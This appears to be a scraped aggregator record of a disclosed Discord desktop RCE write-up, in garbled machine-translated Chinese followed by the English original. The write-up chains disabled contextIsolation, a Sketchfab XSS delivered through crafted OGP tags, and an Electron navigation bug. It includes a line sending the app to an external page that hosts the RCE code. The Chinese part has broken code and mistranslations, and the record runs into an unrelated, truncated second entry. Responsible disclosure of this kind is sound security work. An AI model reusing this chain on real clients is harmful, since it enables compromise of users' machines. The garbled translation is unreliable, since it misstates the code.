&#34\uff1bexeca&#34\uff1b\u5e93\u6267\u884c\u7a0b\u5e8f\uff0c\u5982\u4e0b\u6240\u793a\uff1a\nModule e.exports.getGPUDriverVersions=async()=&gt\uff1b{{\u5982\u679c(process.platform\uff01==&#39\uff1bwin32&#39\uff1b){{0}\uff1b\u8fd4\u56de{}\uff1b{{}}*const nvidiaSmiPath=`${process.env[&#39\uff1bProgramW6432&#39\uff1b]}/NVIDIA\u516c\u53f8/nvsmi/nvidia-smi.exe`\uff1b*try{nvidiaResult.nvidia=parseNvidiaSmiOutput(await execa(nvidiaSmiPath\uff0c[])\uff1b{nvidia=parsenvidiaSmiOutput(aWait execa(nvidiaSmiPath\uff0c[]))\uff1b**}catch(E){*Result.nvidia={error\uff1ae.toString()}\uff1b**}**\u8fd4\u56de\u7ed3\u679c\uff1b}\uff1b\n\u901a\u5e38\uff0cexeca\u5c1d\u8bd5\u6267\u884c\u5728nvidiaSmiPath\u53d8\u91cf\u4e2d\u6307\u5b9a\u7684&#34\uff1bnvidia-smi.exe&#34\uff1b\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u88ab\u8986\u76d6\u7684RegExp.Prototype.test\u548cArray.Prototype.join\uff0c\u8be5\u53c2\u6570\u5728execa\u7684\u5185\u90e8\u5904\u7406\u4e2d\u88ab\u66ff\u6362\u4e3a&#34\uff1bcalc&#34\uff1b\u3002\n\u5269\u4e0b\u7684\u5de5\u4f5c\u662f\u627e\u5230\u4e00\u79cd\u5728\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884cJavaScript\u7684\u65b9\u6cd5\u3002\u5982\u679c\u6211\u80fd\u627e\u5230\u5b83\uff0c\u5c31\u80fd\u627e\u5230\u771f\u6b63\u7684RCE\u3002\n\u5982\u4e0a\u6240\u8ff0\uff0c\u6211\u53d1\u73b0\u4efb\u610fJavaScript\u6267\u884c\u53ef\u80fd\u4f1a\u53d1\u751fRCE\uff0c\u56e0\u6b64\u6211\u8bd5\u56fe\u67e5\u627eXSS\u6f0f\u6d1e\u3002\u8fd9\u6b3e\u5e94\u7528\u7a0b\u5e8f\u652f\u6301\u81ea\u52a8\u94fe\u63a5\u6216\u964d\u4ef7\u529f\u80fd\uff0c\u4f46\u770b\u8d77\u6765\u4e0d\u9519\u3002\u6240\u4ee5\u6211\u628a\u6ce8\u610f\u529b\u8f6c\u5411\u4e86iframe\u5d4c\u5165\u529f\u80fd\u3002\u4f8b\u5982\uff0ciFrame Embedded\u662f\u5728\u53d1\u5e03YouTube URL\u65f6\u81ea\u52a8\u5728\u804a\u5929\u4e2d\u663e\u793a\u89c6\u9891\u64ad\u653e\u5668\u7684\u529f\u80fd\u3002\n\u5f53URL\u53d1\u5e03\u540e\uff0cDiscorde\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u8be5URL\u7684OGP\u4fe1\u606f\uff0c\u5982\u679c\u6709OGP\u4fe1\u606f\uff0c\u5b83\u4f1a\u5728\u804a\u5929\u4e2d\u663e\u793a\u9875\u9762\u7684\u6807\u9898\u3001\u63cf\u8ff0\u3001\u7f29\u7565\u56fe\u3001\u5173\u8054\u89c6\u9891\u7b49\u3002\n\u4e0d\u4e00\u81f4\u4eceOGP\u4e2d\u63d0\u53d6\u89c6\u9891URL\uff0c\u5e76\u4e14\u4ec5\u5f53\u8be5\u89c6\u9891URL\u662f\u88ab\u5141\u8bb8\u7684\u57df\u5e76\u4e14\u8be5URL\u5b9e\u9645\u4e0a\u5177\u6709\u5d4c\u5165\u9875\u9762\u7684URL\u683c\u5f0f\u65f6\uff0c\u8be5URL\u624d\u88ab\u5d4c\u5165\u5230IFRAME\u4e2d\u3002\n\u6211\u627e\u4e0d\u5230\u5173\u4e8eiFrame\u4e2d\u53ef\u4ee5\u5d4c\u5165\u54ea\u4e9b\u670d\u52a1\u7684\u6587\u6863\uff0c\u6240\u4ee5\u6211\u8bd5\u56fe\u901a\u8fc7\u68c0\u67e5CSP\u7684frame-src\u6307\u4ee4\u6765\u83b7\u5f97\u63d0\u793a\u3002\u5f53\u65f6\u4f7f\u7528\u7684CSP\u5982\u4e0b\uff1a\n\u5185\u5bb9-\u5b89\u5168-\u7b56\u7565\uff1a[...]\uff1b\u5e27\u6e90https://*.youtube.com https://*.twitch.tv https://open.spotify.com https://w.soundcloud.com https://sketchfab.com https://player.vimeo.com https://www.funimation.com https://twitter.com https://www.google.com/recaptcha/https://recaptcha.net/recaptcha/https://js.stripe.com https://assets.braintreegateway.com https://checkout.paypal.com https://*.watchanimeattheoffice.com\u3002\n\u663e\u7136\uff0c\u5b83\u4eec\u4e2d\u7684\u4e00\u4e9b\u5217\u51fa\u662f\u4e3a\u4e86\u5141\u8bb8IFRAME\u5d4c\u5165(\u4f8b\u5982YouTube\u3001Twitch\u3001Spotify)\u3002\u6211\u8bd5\u56fe\u901a\u8fc7\u5728OGP\u4fe1\u606f\u4e2d\u9010\u4e2a\u6307\u5b9a\u57df\u540d\u6765\u68c0\u67e5URL\u662f\u5426\u53ef\u4ee5\u5d4c\u5165\u5230IFRAME\u4e2d\uff0c\u5e76\u8bd5\u56fe\u5728\u5d4c\u5165\u7684\u57df\u540d\u4e0a\u627e\u5230XSS\u3002\u7ecf\u8fc7\u4e00\u756a\u5c1d\u8bd5\uff0c\u6211\u53d1\u73b0CSP\u4e2d\u5217\u51fa\u7684\u57df\u540d\u4e4b\u4e00\u7684SketchFab.com\u53ef\u4ee5\u5d4c\u5165\u5230IFRAME\u4e2d\uff0c\u5e76\u5728Embed\u9875\u9762\u627e\u5230\u4e86XSS\u3002\u201c\u6211\u5f53\u65f6\u5e76\u4e0d\u77e5\u9053Sketchfab\uff0c\u4f46\u5b83\u4f3c\u4e4e\u662f\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u53d1\u5e03\u3001\u4e70\u53563D\u6a21\u578b\u7684\u5e73\u53f0\u3002\u57283D\u6a21\u578b\u7684\u811a\u6ce8\u4e2d\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u57fa\u4e8eDOM\u7684XSS\u3002\n\u4e0b\u9762\u662fPoC\uff0c\u5b83\u5177\u6709\u7cbe\u5fc3\u7f16\u5236\u7684OGP\u3002\u5f53\u6211\u5c06\u8fd9\u4e2aURL\u53d1\u5e03\u5230\u804a\u5929\u4e2d\u65f6\uff0cSketchfab\u88ab\u5d4c\u5165\u5230\u804a\u5929\u7684iframe\u4e2d\uff0c\u5728iframe\u4e0a\u5355\u51fb\u51e0\u4e0b\u4e4b\u540e\uff0c\u4efb\u610fJavaScript\u5c31\u4f1a\u6267\u884c\u3002\n&lt\uff1bhead&gt\uff1bmeta charset=&#34\uff1butf-8&#34\uff1b&gt\uff1bmeta property=&#34\uff1bog\uff1atitle&#34\uff1brce demo&#34\uff1b&gt\uff1bmeta property=&#34\uff1brce demo&#34\uff1b&gt\uff1bmeta property=&#34\uff1b[...]\uff1b&lt\uff1bmeta property=&#34\uff1bog\uff1aVideo\uff1aurl&#34\uff1bcontent=&#34\uff1bhttps\uff1a//rce demo&34\uff1b&gt\uff1b[...]\uff1a&lt\uff1bmeta property=&#34\uff1bhttps\uff1a//rce demo&#34\uff1b&lt\uff1bmeta property=&#34\uff1bMeta property=&#34\uff1bog\uff1avideo\uff1atype&#34\uff1bcontent=&#34\uff1btext/html&34\uff1b&gt\uff1bend\uff1bmeta property=&#34\uff1bog\uff1avideo\uff1awidth&#34\uff1bcontent=&#34\uff1b1280&34\uff1b&gt\uff1bend=&#34\uff1b1280&34\uff1b&gt\uff1bmeta property=&#34\uff1bog\uff1avideo\uff1aHeight&34\uff1bcontent=&#34\uff1b720&34\uff1b&lt\uff1b&head&gt\uff1b\n\u597d\u7684\uff0c\u6700\u540e\u6211\u627e\u5230\u4e86\u4e00\u4e2aXSS\uff0c\u4f46\u662fJavaScript\u4ecd\u7136\u5728IFRAME\u4e0a\u6267\u884c\u3002\u7531\u4e8eElectron\u4e0d\u4f1a\u5c06\u7f51\u9875\u5916\u7684JavaScript\u4ee3\u7801\u52a0\u8f7d\u5230IFRAME\u4e2d\uff0c\u56e0\u6b64\u5373\u4f7f\u6211\u8986\u76d6\u4e86IFRAME\u4e0a\u7684JavaScript\u5185\u7f6e\u65b9\u6cd5\uff0c\u4e5f\u65e0\u6cd5\u5e72\u6270Node.js\uff1b\u5173\u952e\u90e8\u5206\u3002\u8981\u5b9e\u73b0RCE\uff0c\u6211\u4eec\u9700\u8981\u8d70\u51faiFrame\u5e76\u5728\u9876\u7ea7\u6d4f\u89c8\u4e0a\u4e0b\u6587\u4e2d\u6267\u884cJavaScript\u3002\u8fd9\u9700\u8981\u4eceIFRAME\u6253\u5f00\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u6216\u4eceIFRAME\u5c06\u9876\u90e8\u7a97\u53e3\u5bfc\u822a\u5230\u53e6\u4e00\u4e2aURL\u3002\n\u6211\u68c0\u67e5\u4e86\u76f8\u5173\u4ee3\u7801\uff0c\u901a\u8fc7\u5728\u4e3b\u8fdb\u7a0b\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528&#34\uff1bnew-Window&#34\uff1b\u548c&#34\uff1bwill-Navigesp\u4e8b\u4ef6\u627e\u5230\u4e86\u9650\u5236\u5bfc\u822a\u7684\u4ee3\u7801\uff1a\nMainWindow.webContents.on(&#39\uff1bnew-window&#39\uff1b\uff0c(e\uff0cwindowURL\uff0cFrameName\uff0cDisposition\uff0cOptions)=&gt\uff1b{WindowURL\uff0cFrame Name\uff0cDisposition\uff0cOptions()\uff1b|if(frame Name.startsWith(Discord_Nampace)&amp\uff1b&amp\uff1bwindowURL.startsWith(WebAPP_ENDPOINT)){\uff0cpopoutWindows.openOrFocusWindow(e\uff0cwindowURL\uff0cframe Name\uff0cOptions)\uff1b**}Else}{_Electron.shell.openExternal(WindowURL)\uff1b**}})\uff1b[...]\u3002MainWindow.webContents.on(&#39\uff1bwill-navigate&#39\uff1b\uff0c(evt\uff0curl)=&gt\uff1b{#if(\uff01inside AuthFlow&amp\uff1b&amp\uff1b\uff01url.startsWith(WebAPP_ENDPOINT)){#\uff1b#}})\uff1b\n\u6211\u8ba4\u4e3a\u8fd9\u6bb5\u4ee3\u7801\u53ef\u4ee5\u6b63\u786e\u5730\u963b\u6b62\u7528\u6237\u6253\u5f00\u65b0\u7a97\u53e3\u6216\u5bfc\u822a\u9876\u90e8\u7a97\u53e3\u3002\u7136\u800c\uff0c\u6211\u6ce8\u610f\u5230\u4e86\u610f\u60f3\u4e0d\u5230\u7684\u884c\u4e3a\u3002\n\u6211\u8ba4\u4e3a\u4ee3\u7801\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u6211\u5c1d\u8bd5\u68c0\u67e5\u6765\u81eaiframe\u7684\u9876\u90e8\u5bfc\u822a\u662f\u5426\u5df2\u88ab\u963b\u6b62\u3002\u7136\u540e\uff0c\u4ee4\u4eba\u60ca\u8bb6\u7684\u662f\uff0c\u5bfc\u822a\u5e76\u6ca1\u6709\u56e0\u4e3a\u67d0\u79cd\u539f\u56e0\u800c\u88ab\u5c01\u9501\u3002\u6211\u539f\u4ee5\u4e3a\u5728\u5bfc\u822a\u53d1\u751f\u4e4b\u524d\uff0c&#34\uff1bwill-Naviges\u7b2c#34\uff1b\u4e8b\u4ef6\u4f1a\u6355\u6349\u5230\u8be5\u5c1d\u8bd5\uff0c\u5e76\u88abbrumentDefault()\u62d2\u7edd\uff0c\u4f46\u4e8b\u5b9e\u5e76\u975e\u5982\u6b64\u3002\n\u4e3a\u4e86\u6d4b\u8bd5\u8fd9\u4e00\u884c\u4e3a\uff0c\u6211\u521b\u5efa\u4e86\u4e00\u4e2a\u5c0f\u578b\u7535\u5b50\u5e94\u7528\u7a0b\u5e8f\u3002\u6211\u53d1\u73b0\uff0c\u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u4eceiFrame\u5f00\u59cb\u7684\u9876\u90e8\u5bfc\u822a\u4e0d\u4f1a\u53d1\u51fa&#34\uff1bwill-Navigesp\u4e8b\u4ef6\u3002\u51c6\u786e\u5730\u8bf4\uff0c\u5982\u679c\u9876\u90e8\u7684\u539f\u70b9\u548cIFRAME\u7684\u539f\u70b9\u4f4d\u4e8e\u540c\u4e00\u539f\u70b9\uff0c\u5219\u4f1a\u53d1\u51fa\u8be5\u4e8b\u4ef6\uff0c\u4f46\u5982\u679c\u5b83\u4f4d\u4e8e\u4e0d\u540c\u7684\u539f\u70b9\uff0c\u5219\u4e0d\u4f1a\u53d1\u51fa\u8be5\u4e8b\u4ef6\u3002\u6211\u4e0d\u8ba4\u4e3a\u8fd9\u79cd\u884c\u4e3a\u6709\u5408\u6cd5\u7684\u539f\u56e0\uff0c\u6240\u4ee5\u6211\u8ba4\u4e3a\u8fd9\u662f\u7535\u5b50\u516c\u53f8\u7684\u7f3a\u9677\uff0c\u5e76\u51b3\u5b9a\u7a0d\u540e\u5411\u7535\u5b50\u516c\u53f8\u56e2\u961f\u62a5\u544a\u3002\n\u5728\u8fd9\u4e2a\u9519\u8bef\u7684\u5e2e\u52a9\u4e0b\uff0c\u6211\u80fd\u591f\u7ed5\u8fc7\u5bfc\u822a\u9650\u5236\u3002\u6211\u5e94\u8be5\u505a\u7684\u6700\u540e\u4e00\u4ef6\u4e8b\u5c31\u662f\u4f7f\u7528IFRAME\u7684XSS(\u5982top.location=&#34\uff1b//l0.cm/discord_calc.html&#34\uff1b.)\u5bfc\u822a\u5230\u5305\u542bRCE\u4ee3\u7801\u7684\u9875\u9762\u3002\n\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u901a\u8fc7\u7ed3\u5408\u4e09\u4e2abug\uff0c\u6211\u80fd\u591f\u5b9e\u73b0RCE\uff0c\u5982\u4e0b\u9762\u7684\u89c6\u9891\u6240\u793a\u3002\n\u8fd9\u4e9b\u95ee\u9898\u662f\u901a\u8fc7\u4e0d\u548c\u8c10\u7684\u866b\u5b50\u8d4f\u91d1\u8ba1\u5212\u62a5\u544a\u7684\u3002\u9996\u5148\uff0cDiscorde\u56e2\u961f\u7981\u7528\u4e86Sketchfab\u5d4c\u5165\uff0c\u5e76\u91c7\u53d6\u4e86\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\uff0c\u901a\u8fc7\u5c06\u6c99\u7bb1\u5c5e\u6027\u6dfb\u52a0\u5230IFrame\u6765\u963b\u6b62\u4eceIFrame\u5bfc\u822a\u3002\u8fc7\u4e86\u4e00\u6bb5\u65f6\u95f4\u540e\uff0c\u542f\u7528\u4e86Context Isolation\u3002\u73b0\u5728\uff0c\u5373\u4f7f\u6211\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884c\u4efb\u610fJavaScript\uff0cRCE\u4e5f\u4e0d\u4f1a\u901a\u8fc7\u88ab\u8986\u76d6\u7684JavaScript\u5185\u7f6e\u65b9\u6cd5\u53d1\u751f\u3002\u6211\u6536\u5230\u4e865000\u7f8e\u5143\u4f5c\u4e3a\u8fd9\u4e00\u53d1\u73b0\u7684\u5956\u52b1\u3002\nSketchfab\u4e0a\u7684XSS\u662f\u901a\u8fc7Sketchfab\u7684Bug Bounty\u7a0b\u5e8f\u62a5\u544a\u7684\uff0c\u5e76\u88abSketchfab\u5f00\u53d1\u8005\u8fc5\u901f\u4fee\u590d\u3002\u6211\u5f97\u5230300\u7f8e\u5143\u4f5c\u4e3a\u8fd9\u4e00\u53d1\u73b0\u7684\u5956\u52b1\u3002\nWill-Navise\u4e8b\u4ef6\u4e2d\u7684\u9519\u8bef\u88ab\u62a5\u544a\u4e3a\u7535\u5b50\u90ae\u4ef6\u5b89\u5168\u56e2\u961f\u7684\u9519\u8bef\uff0c\u5e76\u5df2\u4fee\u590d\u4e3a\u4ee5\u4e0b\u6f0f\u6d1e(cve-2020-15174)\u3002\n\u4ec5\u6b64\u800c\u5df2\u3002(\u5c31\u6211\u4e2a\u4eba\u800c\u8a00\uff0c\u6211\u559c\u6b22\u5916\u90e8\u9875\u9762\u7684\u6f0f\u6d1e\u6216\u7535\u5b50\u90ae\u4ef6\u7684\u6f0f\u6d1e\uff0c\u5b83\u4eec\u4e0e\u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u7684\u5b9e\u73b0\u65e0\u5173\uff0c\u5bfc\u81f4\u4e86RCE\uff1a)", "note_en": "A few months ago, I discovered a remote code execution issue in the  Discord desktop application and I reported it via their  Bug Bounty Program.\n The RCE I found was an interesting one because it is achieved by combining multiple bugs. In this article, I&#39;d like to share the details.\n  I kind of felt like finding for vulnerabilities of the Electron app, so I was looking for a bug bounty program which pays the bounty for an Electron app and I found Discord. Also, I am a Discord user and simply wanted to check if the app I&#39;m using is secure, so I decided to investigate.\n        When I test Electron app, first I always check the options of the  BrowserWindow API, which is used to create a browser window. By checking it, I think about how RCE can be achieved when arbitrary JavaScript execution on the renderer is possible.\n The Discord&#39;s Electron app is not an open source project but the Electron&#39;s JavaScript code is saved locally with the asar format and I was able to read it just by extracting it.\n  const mainWindowOptions = { \u00a0\u00a0title: &#39;Discord&#39;, \u00a0\u00a0backgroundColor: getBackgroundColor(), \u00a0\u00a0width: DEFAULT_WIDTH, \u00a0\u00a0height: DEFAULT_HEIGHT, \u00a0\u00a0minWidth: MIN_WIDTH, \u00a0\u00a0minHeight: MIN_HEIGHT, \u00a0\u00a0transparent: false, \u00a0\u00a0frame: false, \u00a0\u00a0resizable: true, \u00a0\u00a0show: isVisible, \u00a0\u00a0webPreferences: { \u00a0\u00a0\u00a0\u00a0blinkFeatures: &#39;EnumerateDevices,AudioOutputDevices&#39;, \u00a0\u00a0\u00a0\u00a0  nodeIntegration: false, \u00a0\u00a0\u00a0\u00a0preload: _path2.default.join(__dirname, &#39;mainScreenPreload.js&#39;), \u00a0\u00a0\u00a0\u00a0nativeWindowOpen: true, \u00a0\u00a0\u00a0\u00a0enableRemoteModule: false, \u00a0\u00a0\u00a0\u00a0spellcheck: true \u00a0\u00a0} };\n The important options which we should check here are especially  nodeIntegration and  contextIsolation. From the above code, I found that the  nodeIntegration option is set to false and the  contextIsolation option is set to false (the default of the used version) in the Discord&#39;s main window.\n If the nodeIntegration is set to true, a web page&#39;s JavaScript can use Node.js features easily just by calling the  require(). For example, the way to execute the calc application on Windows is:\n  In this time, the  nodeIntegration was set to false, so I couldn&#39;t use Node.js features by calling the  require() directly.\n However, there is still a possibility of access to Node.js features. The  contextIsolation, another important option, was set to false. This option should not be set to false if you want to eliminate the possibility of RCE on your app.\n If the  contextIsolation is disabled, a web page&#39;s JavaScript can affect the execution of the  Electron&#39;s internal JavaScript code on the renderer, and preload scripts (In the following, these JavaScript will be referred to as the JavaScript code outside web pages).\u00a0For example, if you override\u00a0  Array.prototype.join, one of the JavaScript built-in methods, with another function from a web page&#39;s JavaScript, the JavaScript code outside web pages also will use the overridden function when the  join is called.\n This behavior is dangerous because Electron allows the JavaScript code outside web pages to use the Node.js features regardless the  nodeIntegration option and by interfering with them from the function overridden in the web page, it could be possible to achieve RCE even if the  nodeIntegration is set to false.\n By the way, a such trick was previously not known. It was first discovered in a pentest by Cure53, which I also joined in, in 2016. After that, we reported it to Electron team and the  contextIsolation was introduced.\n Recently, that pentest report was published. If you are interested, you can read it from the following link:\n    The  contextIsolation introduces the separated contexts between the web page and the JavaScript code outside web pages so that the JavaScript execution of each code does not affect each. This is a necessary faeture to eliminate the possibility of RCE, but this time it was disabled in Discord.\n Now I found that the  contextIsolation is disabled, so I started looking for a place where I could execute arbitrary code by interfering with the JavaScript code outside web pages.\n Usually, when I create a PoC for RCE in the Electron&#39;s pentests, I first try to achieve RCE by using the Electron&#39;s internal JavaScript code on the renderer. This is because the Electron&#39;s internal JavaScript code on the renderer can be executed in any Electron app, so basically I can reuse the same code to achieve RCE and it&#39;s easy.\n In my slides,  I introduced that RCE can be achieved by using the code which Electron executes at the navigation timing. It&#39;s not only possible from that code but there are such code in some places. (I&#39;d like to publish examples of the PoC in the future.)\n However, depending on the version of Electron used, or the  BrowserWindow option which is set, because the code has been changed or the affected code can&#39;t be reached correctly, sometimes PoC via the Electron&#39;s code does not work well. In this time, it did not work, so I decided to change the target to the preload scripts.\n When checking the preload scripts, I found that Discord exposes the function, which allows some allowed modules to be called via  DiscordNative.nativeModules.requireModule(&#39;MODULE-NAME&#39;), into the web page.\n  Here, I couldn&#39;t use modules that can be used for RCE directly, such as  child_process module, but I found a code where RCE can be achieved by overriding the JavaScript built-in methods and interfering with the execution of the exposed module.\n The following is the PoC. I was able to confirm that the calc application is popped up when I call the  getGPUDriverVersions function which is defined in the module called &#34; discord_utils&#34; from devTools, while overriding the  RegExp.prototype.test and  Array.prototype.join.\n  The  getGPUDriverVersions function tries to execute the program by using the &#34; execa&#34; library, like the following:\n module.exports.getGPUDriverVersions = async () =&gt; { \u00a0\u00a0if (process.platform !== &#39;win32&#39;) { \u00a0\u00a0\u00a0\u00a0return {}; \u00a0\u00a0}  \u00a0\u00a0const result = {}; \u00a0\u00a0const nvidiaSmiPath = `${process.env[&#39;ProgramW6432&#39;]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;  \u00a0\u00a0try { \u00a0\u00a0\u00a0\u00a0result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, [])); \u00a0\u00a0} catch (e) { \u00a0\u00a0\u00a0\u00a0result.nvidia = {error: e.toString()}; \u00a0\u00a0}  \u00a0\u00a0return result; };\n Usually the  execa tries to execute &#34; nvidia-smi.exe&#34;, which is specified in the  nvidiaSmiPath variable, however, due to the overridden  RegExp.prototype.test and  Array.prototype.join, the argument is replaced to &#34; calc&#34; in the  execa&#39;s internal processing.\n    The remaining work is to find a way to execute JavaScript on the application. If I can find it, it leads to actual RCE.\n  As explained above, I found that RCE could happen from arbitrary JavaScript execution, so I was trying to find an XSS vulnerability. The app supports the autolink or Markdown feature, but looked like it is good. So I turned my attention to the iframe embeds feature. The iframe embeds is the feature which automatically displays the video player on the chat when the YouTube URL is posted, for example.\n When the URL is posted, Discord tries to get the  OGP information of that URL and if there is the OGP information, it displays the page&#39;s title, description, thumbnail image, associated video and so on in the chat.\n The Discord extracts the video URL from the OGP and only if the video URL is allowed domain and the URL has actually the URL format of the embeds page, the URL is embedded in the iframe.\n I couldn&#39;t find the documentation about which services can be embedded in the iframe, so I tried to get a hint by checking the CSP&#39;s  frame-src directive. At that time, the following CSP was used:\n Content-Security-Policy: [...] ; frame-src https://*.youtube.com https://*.twitch.tv https://open.spotify.com https://w.soundcloud.com https://sketchfab.com https://player.vimeo.com https://www.funimation.com https://twitter.com https://www.google.com/recaptcha/ https://recaptcha.net/recaptcha/ https://js.stripe.com https://assets.braintreegateway.com https://checkout.paypal.com https://*.watchanimeattheoffice.com\n Obviously, some of them are listed to allow iframe embeds (e.g. YouTube, Twitch, Spotify).\u00a0I tried to check if the URL can be embeded in the iframe by specifying the domain into the OGP information one by one and tried to find XSS on the embedded domains. After some attempts, I found that the\u00a0 sketchfab.com, which is one of the domains listed in the CSP, can be embedded in the iframe and found XSS on the embeds page.\u00a0I didn&#39;t know about Sketchfab at that time, but it seems that it is a platform in which users can publish, buy and sell 3D models. There was a simple DOM-based XSS in the footnote of the 3D model.\n The following is the PoC, which has the crafted OGP. When I posted this URL to the chat, the Sketchfab was embedded into the iframe on the chat, and after a few clicks on the iframe, arbitrary JavaScript was executed.\n  &lt;head&gt; \u00a0\u00a0\u00a0\u00a0&lt;meta charset=&#34;utf-8&#34;&gt; \u00a0\u00a0\u00a0\u00a0&lt;meta property=&#34;og:title&#34; content=&#34;RCE DEMO&#34;&gt; \u00a0\u00a0\u00a0\u00a0[...] \u00a0\u00a0\u00a0\u00a0&lt;meta property=&#34;  og:video:url&#34; content=&#34;https://  sketchfab.com/models/2b198209466d43328169d2d14a4392bb/embed&#34;&gt; \u00a0\u00a0\u00a0\u00a0&lt;meta property=&#34;og:video:type&#34; content=&#34;text/html&#34;&gt; \u00a0\u00a0\u00a0\u00a0&lt;meta property=&#34;og:video:width&#34; content=&#34;1280&#34;&gt; \u00a0\u00a0\u00a0\u00a0&lt;meta property=&#34;og:video:height&#34; content=&#34;720&#34;&gt; &lt;/head&gt;\n Okay, finally I found an XSS, but the JavaScript is still executed on the iframe. Since Electron doesn&#39;t load the &#34;JavaScript code outside web pages&#34; into the iframe, so even if I override the JavaScript built-in methods on the iframe, I can&#39;t interfere with the Node.js&#39; critical parts. To achieve RCE, we need to get out of the iframe and execute JavaScript in a top-level browsing context. This requires opening a new window from the iframe or navigating the top window to another URL from the iframe.\n I checked the related code and I found the code to restrict navigations by using &#34; new-window&#34; and &#34; will-navigate&#34; event in the code of the main process:\n mainWindow.webContents.on(&#39;new-window&#39;, (e, windowURL, frameName, disposition, options) =&gt; { \u00a0\u00a0e.preventDefault(); \u00a0\u00a0if (frameName.startsWith(DISCORD_NAMESPACE) &amp;&amp; windowURL.startsWith(WEBAPP_ENDPOINT)) { \u00a0\u00a0\u00a0\u00a0popoutWindows.openOrFocusWindow(e, windowURL, frameName, options); \u00a0\u00a0} else { \u00a0\u00a0\u00a0\u00a0_electron.shell.openExternal(windowURL); \u00a0\u00a0} }); [...] mainWindow.webContents.on(&#39;will-navigate&#39;, (evt, url) =&gt; { \u00a0\u00a0if (!insideAuthFlow &amp;&amp; !url.startsWith(WEBAPP_ENDPOINT)) { \u00a0\u00a0\u00a0\u00a0evt.preventDefault(); \u00a0\u00a0} });\n I thought this code can correctly prevent users from opening the new window or navigating the top window. However, I noticed the unexpected behavior.\n  I thought the code is okay but I tried to check that the top navigation from the iframe is blocked anyway. Then, surprisingly, the navigation was not blocked for some reason. I expected that the attempt is catched by the &#34; will-navigate&#34; event before the navigation happens and refused by the  preventDefault(), but is not.\n To test this behavior, I created a small Electron app. And I found that the &#34; will-navigate&#34; event is not emitted from the top navigation started from an iframe for some reason. To be exact, if the top&#39;s origin and iframe&#39;s origin is in the same-origin, the event is emitted but if it is in the different origin, the event is not emitted. I didn&#39;t think that there is a a legitimate reason for this behavior, so I thought this is an Electron&#39;s bug and decided to report to Electron team later.\n With the help of this bug, I was able to bypass the navigation restriction. The last thing I should do is just a navigation to the page which contains the RCE code by using the iframe&#39;s XSS, like  top.location=&#34;//l0.cm/discord_calc.html&#34;.\n In this way, by combining with three bugs, I was able to achieve RCE as shown in the video below.\n    These issues were reported through  Discord&#39;s Bug Bounty Program. First, Discord team disabled the Sketchfab embeds, and a workaround was taken to prevent navigation from the iframe by adding the  sandbox attribute to the iframe. After a while, the\u00a0 contextIsolation was enabled. Now even if I could execute arbitrary JavaScript on the app, RCE does not occur via the overridden JavaScript built-in methods. I received $5,000 as a reward for this discovery.\n The XSS on Sketchfab was reported through  Sketchfab&#39;s Bug Bounty Program and fixed by Sketchfab developers quickly. I received $300 as a reward for this discovery.\n The bug in the &#34; will-navigate&#34; event was reported as a bug of Electron to  Electron&#39;s security team, and it was fixed as the following vulnerability (CVE-2020-15174).\n  That&#39;s it.\u00a0Personally, I like that the external page&#39;s bug or Electron&#39;s bug, which is unrelated to the app itself&#39;s implementation, led to RCE :)", "posttime": "2020-10-19 11:13:53", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u5e94\u7528,desktop,iframe", "title": "\u4e0d\u548c\u8c10\u684c\u9762\u5e94\u7528RCE", "title_en": "Discord Desktop App RCE", "transed": 1, "url": "https://mksben.l0.cm/2020/10/discord-desktop-rce.html", "via": "", "real_tags": ["\u5e94\u7528", "desktop", "iframe"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029702, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5982\u679c\u4f60\u89c9\u5f97\u8fd9\u4e2a\u9875\u9762\u6709\u8da3\uff0c\u6211\u5f88\u4e50\u610f\u548c\u4f60\u804a\u5929\u3002\r\u5982\u679c\u4f60\u5728\u8c37\u6b4c\u5de5\u4f5c\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5feb\u518d\u8c08\u3002\u6211\u7684\u7535\u8bdd\u662f\u3002\n\u672c\u7f51\u7ad9\u5728\u53ef\u7591\u60c5\u51b5\u4e0b\u5df2\u88ab\u8c37\u6b4c\u5904\u7f5a\u3002\u7f5a\u91d1\r\u4f7f\u6211\u4eec\u7684\u7f51\u9875\u5728Google\u7684\u641c\u7d22\u7ed3\u679c\u4e2d\u663e\u793a\u5728\u6bd4\u4ec0\u4e48\u4f4d\u7f6e\u66f4\u4f4e\u7684\u4f4d\u7f6e\r\u4ed6\u4eec\u9760\u81ea\u5df1\u7684\u529f\u52b3\u8d62\u5f97\u4e86\u80dc\u5229\u3002\u8fd9\u662f\u4e00\u79cd\u6545\u610f\u7684\u3001\u9690\u85cf\u7684\u3001\u624b\u5de5\u6267\u884c\u7684\u5904\u7f5a\uff0c\u7531\r\u8c37\u6b4c\u5bf9\u8fd9\u4e2a\u7f51\u7ad9\u7684\u653b\u51fb\u3002\n\u8be5\u516c\u53f8\u516c\u5f00\u8868\u793a\uff0c\u7f51\u7ad9\u53ef\u4ee5\u901a\u8fc7\r\u4ed6\u4eec\u63d0\u4f9b\u7684\u5de5\u5177\u3002\u4ed6\u4eec\u6ca1\u6709\u900f\u9732\u7684\u662f\uff0c\u8c37\u6b4c\u80fd\u591f\u800c\u4e14\u786e\u5b9e\u505a\u5230\u4e86\u8fd9\u4e00\u70b9\u3002\r\u5bf9\u7f51\u7ad9\u5b9e\u65bd\u9690\u6027\u5904\u7f5a\u3002\u65e2\u7136\u4ed6\u4eec\u90fd\u85cf\u8d77\u6765\u4e86\uff0c\u5c31\u6ca1\u6709\u529e\u6cd5\r\u7f51\u7ad9\u6240\u6709\u8005\u